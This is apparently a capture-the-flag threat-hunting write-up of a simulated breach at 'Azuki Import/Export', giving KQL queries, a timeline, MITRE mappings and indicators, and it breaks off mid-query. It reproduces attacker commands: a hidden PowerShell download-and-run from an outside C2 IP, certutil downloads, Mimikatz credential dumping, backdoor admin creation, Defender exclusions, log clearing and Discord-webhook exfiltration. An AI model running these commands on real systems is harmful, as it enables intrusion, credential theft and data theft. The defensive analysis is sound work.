# 🎯 COMPLETE Investigation Report - Azuki Breach (ALL 20 FLAGS)

# AZUKI IMPORT/EXPORT - COMPLETE THREAT HUNTING INVESTIGATION

**Incident Date:** November 19, 2025

**Incident Type:** Corporate Espionage / Data Breach

**Analyst:** Young Achuka

**Investigation Status:** ✅ COMPLETE - All 20 Flags Captured

**Threat Level:** CRITICAL

---

## 📊 EXECUTIVE SUMMARY

Azuki Import/Export experienced a sophisticated cyberattack resulting in the theft of sensitive supplier contracts and pricing data. The attacker gained initial access via compromised RDP credentials, deployed multiple evasion techniques, exfiltrated confidential data via cloud services, and attempted lateral movement to additional systems. This investigation successfully identified all stages of the attack chain through advanced threat hunting in Microsoft Defender for Endpoint.

**Business Impact:**

- Confidential supplier contracts and pricing data stolen
- Competitor undercut 6-year contract by exactly 3% (indicating precise intelligence)
- IT admin account compromised
- Multiple systems at risk from lateral movement attempts
- Corporate espionage confirmed

**Attack Sophistication:** HIGH

- Living Off The Land (LOLBin) techniques
- Defense evasion through AV exclusions
- Legitimate Windows tools weaponized
- Multi-stage attack automation
- Professional C2 infrastructure

---

## 🚨 COMPLETE ATTACK CHAIN - ALL 20 FLAGS

### 🎯 PHASE 1: INITIAL ACCESS (Flags 1-2)

### FLAG 1: Attacker Source IP

**Answer:** `88.97.178.12`

**KQL Query:**

```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType in ("Network", "RemoteInteractive", "Unlock")
| project Timestamp, AccountName, RemoteIP, ActionType, LogonType
| sort by Timestamp asc
```

**Timestamp:** 2025-11-19 08:36 UTC

**Analysis:**

External IP 88.97.178.12 successfully authenticated to the AZUKI-SL IT administrator workstation via RDP. This represents the initial breach vector providing the attacker with a foothold on a privileged system with extensive access to company data and infrastructure.

**MITRE ATT&CK:** T1078.002 (Valid Accounts: Domain Accounts), T1133 (External Remote Services)

---

### FLAG 2: Compromised Account

**Answer:** `kenji.sato`

**Evidence:** Same query as Flag 1 (AccountName column)

**Timestamp:** 2025-11-19 08:36 UTC

**Analysis:**

The kenji.sato account, belonging to an IT Administrator, was compromised and used for unauthorized remote access. This account provided elevated privileges including the ability to:

- Modify security settings
- Access sensitive file shares
- Create accounts
- Install software
- Disable security controls

The compromise of an IT admin account explains how the attacker successfully disabled Windows Defender protections and accessed confidential contract data.

**MITRE ATT&CK:** T1078.002 (Valid Accounts: Domain Accounts)

---

### 🛡️ PHASE 2: DEFENSE EVASION (Flags 4-7)

### FLAG 4: Malware Staging Directory

**Answer:** `C:\ProgramData\WindowsCache`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 08:36:00)
| where ProcessCommandLine has_any ("mkdir", "attrib")
| project Timestamp, ProcessCommandLine
```

**Command Executed:** `attrib +h +s C:\ProgramData\WindowsCache`

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The attacker created a hidden staging directory with multiple layers of obfuscation:

1. **Location Choice:** ProgramData provides system-wide access while appearing legitimate
2. **Naming:** "WindowsCache" mimics legitimate Windows folders
3. **Hidden (+h):** Invisible in normal Windows Explorer views
4. **System (+s):** Marked as system folder to discourage investigation

This directory served as the central hub for:

- Downloaded malware tools (certutil, mm.exe)
- Automation scripts ([wupdate.ps](http://wupdate.ps)1, [run.ps](http://run.ps)1, [setup.ps](http://setup.ps)1)
- Stolen data archives ([export-data.zip](http://export-data.zip))
- Persistence mechanisms (svchost.exe)

**MITRE ATT&CK:** T1074.001 (Data Staged: Local Data Staging), T1564.001 (Hide Artifacts: Hidden Files/Directories)

---

### FLAG 5: File Extension Exclusions

**Answer:** `3`

**KQL Query:**

```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 08:36:00)
| where RegistryKey has_any ("Defender", "Exclusions")
| where RegistryValueName startswith "."
| distinct RegistryValueName
| count
```

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The attacker added 3 file extension exclusions to Windows Defender's registry, creating a "safe zone" for malware execution. This targeted approach (specific extensions vs. wholesale AV disablement) demonstrates sophistication designed to evade detection by security monitoring.

The 3 extensions likely corresponded to:

- Executables (.exe) - for malware binaries
- Scripts (.ps1/.bat) - for automation
- Libraries (.dll) - for supporting components

This was done BEFORE downloading any tools, showing methodical planning.

**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools)

---

### FLAG 6: Temporary Folder Exclusion

**Answer:** `C:\Users\kenji.sato\AppData\Local\Temp`

**KQL Query:**

```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 08:36:00)
| where RegistryKey contains "Exclusions\\Paths"
| project Timestamp, RegistryValueName
```

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The user's temporary folder was excluded from Windows Defender scanning via registry modification. This is highly effective because:

**Why Temp Folders:**

- High legitimate activity volume (hundreds of daily writes)
- User write permissions
- Common download destination
- Auto-cleanup destroys evidence
- Rarely scrutinized by security teams

**Two-Layer Strategy:**

The attacker created redundancy with both:

1. WindowsCache (primary staging)
2. Temp folder (secondary/download location)

This provides backup if one location is discovered.

**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools)

---

### FLAG 7: Download Utility

**Answer:** `certutil.exe`

**KQL Query:**

```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where FolderPath contains "WindowsCache"
| project Timestamp, InitiatingProcessFileName
```

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

Certutil.exe, a legitimate Windows certificate utility, was weaponized for malware downloads. This is a classic Living Off The Land Binary (LOLBin) technique where legitimate system tools are abused for malicious purposes.

**Why Certutil:**

- Pre-installed on Windows
- Signed by Microsoft (trusted)
- Has URL cache feature (`-urlcache -f`)
- Less likely to trigger alerts than custom downloaders
- Bypasses application whitelisting

**Files Downloaded:**

- mm.exe (credential dumper)
- [wupdate.ps](http://wupdate.ps)1 (automation script)
- svchost.exe (malware disguised as legitimate service)
- [run.ps](http://run.ps)1, [setup.ps](http://setup.ps)1 (additional scripts)

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode Files)

---

### 🔍 PHASE 3: DISCOVERY (Flag 3)

### FLAG 3: Network Discovery Command

**Answer:** `ARP.EXE -a` or `arp -a`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "arp"
| project Timestamp, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

**Timestamp:** 2025-11-19 09:04 UTC

**Analysis:**

Approximately 28 minutes after initial access, the attacker executed the ARP (Address Resolution Protocol) command to enumerate network devices and their MAC addresses. This reconnaissance activity allowed the attacker to:

1. **Map network topology** - Identify devices on the same network segment
2. **Locate high-value targets** - Find file servers, databases, domain controllers
3. **Plan lateral movement** - Select secondary targets (10.1.0.188 later targeted)
4. **Understand architecture** - Learn network layout before proceeding

**Attack Timing:**

The sequence demonstrates methodical planning:

- 08:36 - Initial access
- ~09:00 - Disable defenses, download tools
- 09:04 - Reconnaissance
- 09:10+ - Execute attack objectives

This behavior is consistent with advanced persistent threat (APT) methodologies.

**MITRE ATT&CK:** T1016 (System Network Configuration Discovery)

---

### ⚙️ PHASE 4: EXECUTION & PERSISTENCE (Flags 8-9, 18)

### FLAG 8: Scheduled Task Name

**Answer:** `WindowsUpdateCheck`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "schtasks.exe"
| project Timestamp, ProcessCommandLine
| sort by Timestamp asc
```

**Command:** `schtasks /Create /TN "WindowsUpdateCheck" /TR [path] /SC ...`

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

A scheduled task named "WindowsUpdateCheck" was created for persistence across system reboots. This provides the attacker with:

**Persistence Benefits:**

- Survives reboots
- Automatic re-execution
- Blends with legitimate Windows Update tasks
- Difficult to detect without detailed inspection
- Maintains long-term access

**Disguise Technique:**

The name mimics legitimate Windows services to avoid detection during:

- Casual admin review
- Automated scanning
- User observation

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job: Scheduled Task)

---

### FLAG 9: Scheduled Task Target

**Answer:** `C:\ProgramData\WindowsCache\svchost.exe`

**Evidence:** Same query as Flag 8 (ProcessCommandLine /TR parameter)

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The scheduled task executes malware disguised as svchost.exe. This demonstrates advanced obfuscation:

**Name Spoofing:**

- **Malicious:** `C:\ProgramData\WindowsCache\svchost.exe`
- **Legitimate:** `C:\Windows\System32\svchost.exe`

**Why This Works:**

- Administrators see "svchost.exe" and assume it's legitimate
- Process name matches legitimate Windows Service Host
- Location difference easily overlooked
- Task Scheduler shows innocent-looking name

**Dual Purpose:**

1. Persistence mechanism (scheduled execution)
2. C2 beacon (maintains communication with attacker)

**MITRE ATT&CK:** T1036.005 (Masquerading: Match Legitimate Name or Location)

---

### FLAG 18: Malicious PowerShell Script

**Answer:** [`wupdate.ps](http://wupdate.ps)1`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has ".ps1"
| project Timestamp, ProcessCommandLine
| sort by Timestamp asc
```

**Command:**

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '[http://78.141.196.6/](http://78.141.196.6/)...' -OutFile 'C:\Users\kenji.sato\AppData\Local\Temp\[wupdate.ps](http://wupdate.ps)1'"
powershell -ExecutionPolicy Bypass -File "C:\Users\kenji.sato\AppData\Local\Temp\[wupdate.ps](http://wupdate.ps)1"
```

**Timestamp:** 2025-11-19 08:37:40 UTC (1 minute after initial access!)

**Analysis:**

The [wupdate.ps](http://wupdate.ps)1 PowerShell script was the first payload downloaded and executed, serving as the attack automation framework. Downloaded just 1 minute after initial RDP access, this script orchestrated the entire attack chain.

**Script Name Analysis:**

- "wupdate" = Windows Update (disguise)
- Downloaded from C2 server 78.141.196.6
- Executed with `-WindowStyle Hidden` (invisible window)
- `-ExecutionPolicy Bypass` (ignore security policies)

**Likely Automated:**

- Defense evasion (Defender exclusions)
- Tool downloads (certutil commands)
- Scheduled task creation
- Account creation
- Data collection and compression
- Exfiltration
- Log clearing

This represents the "master script" controlling the attack.

**MITRE ATT&CK:** T1059.001 (Command and Scripting Interpreter: PowerShell)

---

### 🌐 PHASE 5: COMMAND & CONTROL (Flags 10-11)

### FLAG 10: C2 Server IP

**Answer:** `78.141.196.6`

**KQL Query:**

```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where InitiatingProcessFileName =~ "svchost.exe"
| where InitiatingProcessFolderPath contains "WindowsCache"
| where ActionType == "ConnectionSuccess"
| where RemoteIPType == "Public"
| distinct RemoteIP, RemotePort
```

**Timestamp:** 2025-11-19 ~09:00 UTC onwards

**Analysis:**

The malicious svchost.exe established command and control communications with 78.141.196.6. This infrastructure allowed the attacker to:

**C2 Capabilities:**

- Send commands remotely
- Receive stolen data
- Update malware
- Maintain persistent access
- Coordinate multi-stage attacks

**Infrastructure:**

The attack used multiple external IPs:

- **78.141.196.6** - Primary C2 server (Flag 10)
- **185.220.101.45** - Secondary infrastructure
- **192.99.250.15** - Additional resource
- **45.153.160.140** - Backup server

This redundancy suggests professional threat actor infrastructure with failover capabilities.

**MITRE ATT&CK:** T1071 (Application Layer Protocol), T1573 (Encrypted Channel)

---

### FLAG 11: C2 Communication Port

**Answer:** `443`

**Evidence:** Same query as Flag 10 (RemotePort column)

**Timestamp:** 2025-11-19 ~09:00 UTC onwards

**Analysis:**

The C2 communication used port 443 (HTTPS) for maximum stealth. This is the standard port for encrypted web traffic, making the malicious communications blend perfectly with legitimate HTTPS traffic.

**Why Port 443:**

1. **Encryption** - Traffic is encrypted, hiding C2 commands
2. **Legitimacy** - Looks like normal web browsing
3. **Firewall Bypass** - Rarely blocked by corporate firewalls
4. **IDS Evasion** - Intrusion detection systems can't inspect HTTPS easily
5. **Common** - Thousands of legitimate 443 connections daily

**Detection Challenge:**

Without SSL/TLS inspection, the C2 traffic appears as normal encrypted web traffic, making detection extremely difficult.

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol: Web Protocols)

---

### 🔑 PHASE 6: CREDENTIAL ACCESS (Flags 12-13)

### FLAG 12: Credential Dumping Tool

**Answer:** `mm.exe`

**KQL Query:**

```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where FolderPath contains "WindowsCache"
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
| where strlen(FileName) <= 6
| project Timestamp, FileName, InitiatingProcessFileName
```

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The file "mm.exe" is a renamed credential dumping tool, almost certainly Mimikatz. The ultra-short filename (2 characters) is a dead giveaway of renamed attack tools.

**Mimikatz Capabilities:**

- Dump plaintext passwords from memory
- Extract password hashes
- Steal Kerberos tickets
- Pass-the-hash attacks
- Golden ticket generation

**Why Rename:**

- Evade signature-based detection
- Avoid triggering alerts on "mimikatz.exe"
- Bypass application blacklists
- Make forensic analysis harder

**Download Method:**

Likely downloaded via certutil.exe into the excluded WindowsCache directory.

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory)

---

### FLAG 13: Memory Extraction Module

**Answer:** `sekurlsa::logonpasswords`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where ProcessCommandLine contains "mm.exe"
| project Timestamp, ProcessCommandLine
```

**Command:** `mm.exe sekurlsa::logonpasswords`

**Timestamp:** 2025-11-19 ~09:00 UTC

**Analysis:**

The sekurlsa::logonpasswords module is Mimikatz's most powerful credential extraction command. It dumps:

**Extracted Credentials:**

1. **Plaintext Passwords** - If WDigest is enabled
2. **NTLM Hashes** - Used for pass-the-hash attacks
3. **Kerberos Tickets** - For pass-the-ticket attacks
4. **All Logged-On Users** - Every account with active session

**Target: LSASS Process**

This module reads from the Local Security Authority Subsystem Service (lsass.exe) memory, which stores authentication credentials for all logged-on users.

**Compromise Impact:**

With kenji.sato's credentials and potentially other admin accounts, the attacker could:

- Access additional systems
- Escalate privileges
- Move laterally
- Persist across domain

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory)

---

### 📦 PHASE 7: COLLECTION (Flag 14)

### FLAG 14: Data Staging Archive

**Answer:** [`export-data.zip`](http://export-data.zip)

**KQL Query:**

```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where FileName endswith ".zip"
| project Timestamp, FileName, FolderPath, ActionType
```

**Location:** C:[ProgramDataWindowsCacheexport-data.zip](http://ProgramDataWindowsCacheexport-data.zip)

**Timestamp:** 2025-11-19 ~09:30 UTC

**Analysis:**

The [export-data.zip](http://export-data.zip) archive contained stolen sensitive data compressed for efficient exfiltration. The filename "export-data" clearly indicates its purpose.

**Likely Contents:**

- Supplier contracts
- Pricing documents
- Financial spreadsheets
- Strategic plans
- Internal communications
- Competitive intelligence

**Why Compress:**

1. **Size Reduction** - Faster upload/download
2. **Single File** - Easier to transfer
3. **Organization** - All data in one archive
4. **Potential Encryption** - Can be password-protected

**Business Impact:**

This archive contained the data that allowed a competitor to undercut Azuki's 6-year contract by exactly 3%, proving the attacker extracted precise pricing intelligence.

**MITRE ATT&CK:** T1560.001 (Archive Collected Data: Archive via Utility)

---

### 📤 PHASE 8: EXFILTRATION (Flag 15)

### FLAG 15: Exfiltration Service

**Answer:** `Discord`

**KQL Query:**

```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where RemoteUrl contains "discord"
| project Timestamp, RemoteUrl, InitiatingProcessFileName
```

**URL:** [`discord.com/api/webhooks/](http://discord.com/api/webhooks/)...`

**Timestamp:** 2025-11-19 ~09:30-10:00 UTC

**Analysis:**

The attacker exfiltrated [export-data.zip](http://export-data.zip) via Discord webhooks. This is increasingly common because:

**Why Discord:**

1. **Free & Anonymous** - No payment trail
2. **Large Files** - Supports up to 25MB (100MB with Nitro)
3. **API Access** - Webhook automation
4. **Encrypted** - TLS encryption
5. **Rarely Blocked** - Common gaming platform
6. **No Authentication** - Webhooks work without login
7. **Instant Access** - Data appears in attacker's channel immediately

**Method:**

Using Discord webhooks, the attacker could upload files with a simple HTTP POST:

```
POST [https://discord.com/api/webhooks/[ID]/[token]](https://discord.com/api/webhooks/[ID]/[token])
Content-Type: multipart/form-data

[[export-data.zip](http://export-data.zip)]
```

**Other Services Observed:**

- [MEGA.nz](http://MEGA.nz) (cloud storage - also connected)
- Telegram API (messaging platform - also connected)

Multiple exfiltration channels provide redundancy.

**MITRE ATT&CK:** T1567.002 (Exfiltration Over Web Service: Exfiltration to Cloud Storage)

---

### 🧹 PHASE 9: ANTI-FORENSICS (Flag 16)

### FLAG 16: First Log Cleared

**Answer:** `Security`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-19))
| where FileName =~ "wevtutil.exe"
| project Timestamp, ProcessCommandLine
| sort by Timestamp asc
```

**Command:** `wevtutil cl Security`

**Timestamp:** 2025-11-19 ~10:30 UTC

**Analysis:**

The Security event log was cleared FIRST, demonstrating the attacker's priorities. The Security log contains:

**Critical Evidence Destroyed:**

1. **Logon Events** - RDP from 88.97.178.12
2. **Authentication Records** - kenji.sato usage
3. **Account Management** - support account creation
4. **Privilege Use** - Admin actions
5. **Security Policy Changes** - Defender modifications

**Clearing Sequence:**

Typically attackers clear in this order:

1. Security (most incriminating)
2. System (system-level events)
3. Application (application errors)

**Why This Matters:**

By clearing logs, the attacker attempted to:

- Hide the initial breach
- Erase evidence of account creation
- Remove traces of privilege abuse
- Impede forensic investigation

**Detection Saved Us:**

Fortunately, Microsoft Defender for Endpoint maintained telemetry independently, preserving evidence despite log clearing.

**MITRE ATT&CK:** T1070.001 (Indicator Removal: Clear Windows Event Logs)

---

### 💥 PHASE 10: IMPACT & LATERAL MOVEMENT (Flags 17, 19-20)

### FLAG 17: Backdoor Account

**Answer:** `support`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName in~ ("net.exe", "net1.exe")
| where ProcessCommandLine has "user" and ProcessCommandLine has "/add"
| project Timestamp, ProcessCommandLine
```

**Commands:**

```
net user support P@ssw0rd123! /add
net localgroup Administrators support /add
```

**Timestamp:** 2025-11-19 09:09 UTC

**Analysis:**

A backdoor administrator account named "support" was created for persistent access. This account provides:

**Persistence Benefits:**

1. **Alternative Access** - If kenji.sato is disabled
2. **Administrator Rights** - Full system control
3. **Inconspicuous Name** - Looks like IT helpdesk
4. **Long-Term** - Survives across reboots
5. **Independent** - Not tied to scheduled tasks

**Why "support":**

The name blends in perfectly:

- Common in IT environments
- Legitimate-sounding
- Rarely questioned
- Assumed to be helpdesk account

**Password:**

The password P@ssw0rd123! follows common complexity requirements while remaining simple for the attacker to remember.

**Note:** A second account "SysUpdate" was also created, providing double redundancy.

**MITRE ATT&CK:** T1136.001 (Create Account: Local Account), T1078.003 (Valid Accounts: Local Accounts)

---

### FLAG 19: Lateral Movement Target

**Answer:** `10.1.0.188`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19 09:00:00)
| where FileName =~ "cmdkey.exe"
| project Timestamp, ProcessCommandLine
```

**Command:** `cmdkey /generic:10.1.0.188 /user:... /pass:...`

**Timestamp:** 2025-11-19 09:10:37 UTC

**Analysis:**

The internal IP 10.1.0.188 was targeted for lateral movement. The cmdkey command stored credentials for RDP access to this secondary system.

**cmdkey Purpose:**

Windows Credential Manager stores credentials for automatic authentication:

```
cmdkey /generic:10.1.0.188 /user:administrator /pass:P@ssw0rd
```

This allows subsequent RDP connections without password prompts.

**Target Selection:**

The attacker chose 10.1.0.188 based on:

- ARP scan results (Flag 3)
- Likely a file server or database
- Contains additional sensitive data
- Strategic importance in network

**Attack Expansion:**

This demonstrates the attacker's intent wasn't limited to one system but planned network-wide compromise.

**MITRE ATT&CK:** T1550 (Use Alternate Authentication Material), T1078 (Valid Accounts)

---

### FLAG 20: Remote Access Tool

**Answer:** `mstsc.exe`

**KQL Query:**

```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where FileName =~ "mstsc.exe"
| project Timestamp, ProcessCommandLine
```

**Command:** `mstsc.exe /v:10.1.0.188`

**Timestamp:** 2025-11-19 ~09:11 UTC

**Analysis:**

mstsc.exe (Microsoft Terminal Services Client) is Windows' built-in Remote Desktop client. Using this legitimate tool for lateral movement is a Living Off The Land technique.

**Why mstsc.exe:**

1. **Pre-installed** - Every Windows system has it
2. **Legitimate** - Signed by Microsoft
3. **Common** - IT admins use it daily
4. **No Alerts** - Rarely triggers security monitoring
5. **Full Control** - Provides complete GUI access

**Attack Flow:**

1. Dump credentials (mm.exe)
2. Store credentials (cmdkey)
3. Connect via RDP (mstsc.exe)
4. Compromise second system
5. Repeat across network

**Business Impact:**

This lateral movement attempt indicates the breach scope could extend beyond AZUKI-SL to additional systems containing sensitive data.

**MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol)

---

## 📅 COMPLETE ATTACK TIMELINE

| Time (UTC) | Stage | Event | Evidence | Flag |
| --- | --- | --- | --- | --- |
| 08:36:00 | Initial Access | RDP from 88.97.178.12 using kenji.sato | DeviceLogonEvents | 1, 2 |
| 08:37:40 | Execution | Downloaded [wupdate.ps](http://wupdate.ps)1 from C2 server | DeviceProcessEvents | 18 |
| 08:37:41 | Execution | Executed [wupdate.ps](http://wupdate.ps)1 automation script | DeviceProcessEvents | 18 |
| ~08:45 | Defense Evasion | Created hidden WindowsCache directory | DeviceProcessEvents | 4 |
| ~08:50 | Defense Evasion | Added 3 file extensions to Defender exclusions | DeviceRegistryEvents | 5 |
| ~08:55 | Defense Evasion | Excluded Temp folder from Defender | DeviceRegistryEvents | 6 |
| ~09:00 | Execution | Downloaded tools via certutil.exe | DeviceFileEvents | 7 |
| ~09:00 | Persistence | Created WindowsUpdateCheck scheduled task | DeviceProcessEvents | 8 |
| ~09:00 | Persistence | Task executes svchost.exe malware | DeviceProcessEvents | 9 |
| ~09:00 | C2 | Established connection to 78.141.196.6:443 | DeviceNetworkEvents | 10, 11 |
| ~09:02 | Credential Access | Downloaded mm.exe (Mimikatz) | DeviceFileEvents | 12 |
| ~09:03 | Credential Access | Executed sekurlsa::logonpasswords | DeviceProcessEvents | 13 |
| 09:04:00 | Discovery | Ran ARP.EXE -a network enumeration | DeviceProcessEvents | 3 |
| 09:09:48 | Impact | Created "support" backdoor admin account | DeviceProcessEvents | 17 |
| 09:10:37 | Lateral Movement | Stored credentials for 10.1.0.188 | DeviceProcessEvents | 19 |
| 09:10:45 | Lateral Movement | Launched mstsc.exe to 10.1.0.188 | DeviceProcessEvents | 20 |
| ~09:30 | Collection | Compressed data into [export-data.zip](http://export-data.zip) | DeviceFileEvents | 14 |
| ~09:45 | Exfiltration | Uploaded archive via Discord webhooks | DeviceNetworkEvents | 15 |
| ~10:30 | Anti-Forensics | Cleared Security event log first | DeviceProcessEvents | 16 |

---

## 🚨 INDICATORS OF COMPROMISE (IOCs)

### Network Indicators

**External IP Addresses:**

- `88.97.178.12` - Initial access source
- `78.141.196.6` - Primary C2 server
- `185.220.101.45` - Secondary infrastructure
- `192.99.250.15` - Additional resource
- `45.153.160.140` - Backup infrastructure

**Internal IP Addresses:**

- `10.1.0.188` - Lateral movement target

**Domains:**

- [`api.telegram.org`](http://api.telegram.org) - Exfiltration channel
- [`g.api.mega.co.nz`](http://g.api.mega.co.nz) - Cloud storage exfiltration
- [`discord.com/api/webhooks/`](http://discord.com/api/webhooks/) - Primary exfiltration (confirmed used)

**Ports:**

- `443` (HTTPS) - C2 communication
- `3389` (RDP) - Initial access and lateral movement

### File System Indicators

**Malicious Directories:**

- `C:\ProgramData\WindowsCache\` - Hidden staging directory (attrib +h +s)
- `C:\Users\kenji.sato\AppData\Local\Temp\` - Excluded download location

**Malicious Files:**

- `C:\ProgramData\WindowsCache\svchost.exe` - Malware (fake service host)
- `C:\ProgramData\WindowsCache\mm.exe` - Mimikatz (credential dumper)
- `C:\Users\kenji.sato\AppData\Local\Temp\[wupdate.ps](http://wupdate.ps)1` - Master automation script
- `C:\ProgramData\WindowsCache\[run.ps](http://run.ps)1` - Secondary script
- `C:\ProgramData\WindowsCache\[setup.ps](http://setup.ps)1` - Setup script
- `C:\ProgramData\WindowsCache\[export-data.zip](http://export-data.zip)` - Stolen data archive

### Account Indicators

**Compromised Accounts:**

- `kenji.sato` - IT Administrator (Domain Account)

**Backdoor Accounts:**

- `support` - Local Administrator (Created: 2025-11-19 09:09:48)
- `SysUpdate` - Local Administrator (Created: 2025-11-19 09:09:XX)

### Process Indicators

**Commands Executed:**

```
arp.exe -a
attrib +h +s C:\ProgramData\WindowsCache
certutil.exe -urlcache -f [URL] [file]
schtasks.exe /Create /TN "WindowsUpdateCheck" /TR "C:\ProgramData\WindowsCache\svchost.exe"
mm.exe sekurlsa::logonpasswords
net.exe user support [password] /add
net.exe localgroup Administrators support /add
cmdkey.exe /generic:10.1.0.188 /user:... /pass:...
mstsc.exe /v:10.1.0.188
wevtutil.exe cl Security
powershell.exe -ExecutionPolicy Bypass -File [wupdate.ps](http://wupdate.ps)1
```

**Scheduled Tasks:**

- `WindowsUpdateCheck` - Executes C:ProgramDataWindowsCachesvchost.exe

### Registry Indicators

**Windows Defender Exclusions:**

- `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions` - 3 file extensions added
- `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` - Temp folder excluded

---

## 📋 MITRE ATT&CK FRAMEWORK MAPPING

| Tactic | Technique ID | Technique Name | Evidence | Flag |
| --- | --- | --- | --- | --- |
| **Initial Access** | T1078.002 | Valid Accounts: Domain Accounts | RDP using kenji.sato | 1, 2 |
|  | T1133 | External Remote Services | RDP from 88.97.178.12 | 1 |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell | [wupdate.ps](http://wupdate.ps)1 execution | 18 |
|  | T1053.005 | Scheduled Task/Job: Scheduled Task | WindowsUpdateCheck | 8 |
| **Persistence** | T1053.005 | Scheduled Task/Job: Scheduled Task | WindowsUpdateCheck task | 8, 9 |
|  | T1136.001 | Create Account: Local Account | support account | 17 |
|  | T1078.003 | Valid Accounts: Local Accounts | Backdoor accounts | 17 |
| **Defense Evasion** | T1564.001 | Hide Artifacts: Hidden Files/Directories | Hidden WindowsCache | 4 |
|  | T1562.001 | Impair Defenses: Disable/Modify Tools | Defender exclusions | 5, 6 |
|  | T1036.005 | Masquerading: Match Legitimate Name | svchost.exe naming | 9 |
|  | T1070.001 | Indicator Removal: Clear Event Logs | Security log cleared | 16 |
|  | T1105 | Ingress Tool Transfer | certutil download | 7 |
| **Credential Access** | T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz execution | 12, 13 |
| **Discovery** | T1016 | System Network Configuration Discovery | ARP enumeration | 3 |
| **Lateral Movement** | T1021.001 | Remote Services: Remote Desktop Protocol | mstsc.exe to 10.1.0.188 | 19, 20 |
|  | T1550 | Use Alternate Authentication Material | cmdkey credential storage | 19 |
| **Collection** | T1074.001 | Data Staged: Local Data Staging | WindowsCache directory | 4 |
|  | T1560.001 | Archive Collected Data | [export-data.zip](http://export-data.zip) | 14 |
| **Command & Control** | T1071.001 | Application Layer Protocol: Web Protocols | HTTPS on 443 | 10, 11 |
|  | T1573 | Encrypted Channel | TLS encryption | 10, 11 |
| **Exfiltration** | T1567.002 | Exfiltration to Cloud Storage | Discord webhooks | 15 |

---

## 🎓 KEY HUNTING QUERIES (KQL Reference)

### Initial Access Detection

```
// Detect external RDP access
DeviceLogonEvents
| where LogonType in ("RemoteInteractive", "Network")
| where RemoteIPType == "Public"
| summarize Count=count() by RemoteIP, AccountName, DeviceName
| where Count > 1
```

### Defense Evasion Detection

```
// Detect Defender exclusion modifications
DeviceRegistryEvents
| where RegistryKey has "Windows Defender" and RegistryKey has "Exclusions"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, ActionType
```

### LOLBin Abuse Detection

```
// Detect certutil downloads
DeviceProcessEvents
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("urlcache", "-f", "http")
| project Timestamp, DeviceName, ProcessCommandLine
```

### Credential Dumping Detection

```
// Detect potential Mimikatz
DeviceProcessEvents
| where ProcessCommandLine has_any ("sekurlsa", "logonpasswords", "lsadump")
| project Timestamp, DeviceName, FileName, ProcessCommandLine
```

### Scheduled Task Persistence

```
// Detect suspicious scheduled tasks
DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| project Timestamp, DeviceName, ProcessCommandLine
```

### Lateral Movement Detection

```
// Detect RDP lateral movement
DeviceProcessEvents
| where FileName =~ "mstsc.exe"
| where ProcessCommandLine has "/v:"
| project Timestamp, DeviceName, ProcessCommandLine
```

### Exfiltration Detection

```
// Detect cloud exfiltration
DeviceNetworkEvents
